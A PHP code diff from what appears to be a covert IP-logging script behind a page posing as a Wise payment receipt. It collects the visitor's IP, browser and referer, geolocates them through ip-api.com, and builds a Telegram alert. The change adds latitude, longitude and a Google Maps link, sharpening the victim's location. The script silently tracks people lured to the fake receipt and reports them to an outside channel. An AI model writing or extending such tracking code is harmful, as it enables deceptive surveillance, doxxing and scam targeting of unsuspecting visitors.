@@ -11,7 +11,7 @@ $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
 $referer    = $_SERVER['HTTP_REFERER'] ?? 'Direct';
 $hora       = date('d/m/Y H:i:s');
 
-$geo = json_decode(@file_get_contents("http://ip-api.com/json/{$ip}?fields=status,message,country,countryCode,region,regionName,city,isp,org,as,mobile,proxy,hosting"), true);
+$geo = json_decode(@file_get_contents("http://ip-api.com/json/{$ip}?fields=status,message,country,countryCode,region,regionName,city,isp,org,as,mobile,proxy,hosting,lat,lon"), true);
 
 $cidade   = $geo['city'] ?? 'Unknown';
 $estado   = $geo['regionName'] ?? 'Unknown';
@@ -19,12 +19,16 @@ $pais     = $geo['country'] ?? 'Unknown';
 $provedor = $geo['isp'] ?? 'Unknown';
 $proxy    = ($geo['proxy'] ?? false) ? 'Yes' : 'No';
 $mobile   = ($geo['mobile'] ?? false) ? 'Yes' : 'No';
+$lat      = $geo['lat'] ?? null;
+$lon      = $geo['lon'] ?? null;
+$maps     = ($lat && $lon) ? "https://maps.google.com/?q={$lat},{$lon}" : null;
 
 // Mensagem Telegram
 $mensagem = "🔴 *Novo acesso ao Comprovante Wise!*\n\n";
 $mensagem .= "🕒 *Data:* $hora\n";
 $mensagem .= "🌐 *IP:* `$ip`\n";
 $mensagem .= "📍 *Localização:* $cidade, $estado - $pais\n";
+if ($maps) $mensagem .= "🗺 *Maps:* $maps\n";
 $mensagem .= "🏢 *Provedor:* $provedor\n";
 $mensagem .= "📱 *Mobile:* $mobile | *VPN/Proxy:* $proxy\n";
 $mensagem .= "🔗 *Referer:* $referer";
